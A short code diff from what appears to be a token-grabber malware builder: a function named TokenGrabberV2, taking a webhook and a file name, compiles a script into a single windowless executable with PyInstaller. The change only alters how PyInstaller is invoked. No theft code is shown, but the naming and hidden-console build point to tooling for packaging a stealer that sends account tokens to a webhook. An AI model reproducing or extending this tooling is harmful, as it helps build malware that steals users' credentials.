@@ -63,7 +63,7 @@ def TokenGrabberV2(WebHook, fileName):
     #     '--log-level=INFO',
     #     '--icon=NONE',
     # ])
-    os.system(f"pyinstaller --onefile --noconsole --clean --log-level=INFO -i NONE -n {fileName} {fileName}.py")
+    os.system(f"python -m PyInstaller --onefile --noconsole --clean --log-level=INFO -i NONE -n {fileName} {fileName}.py")
     try:
         #clean build files
         shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
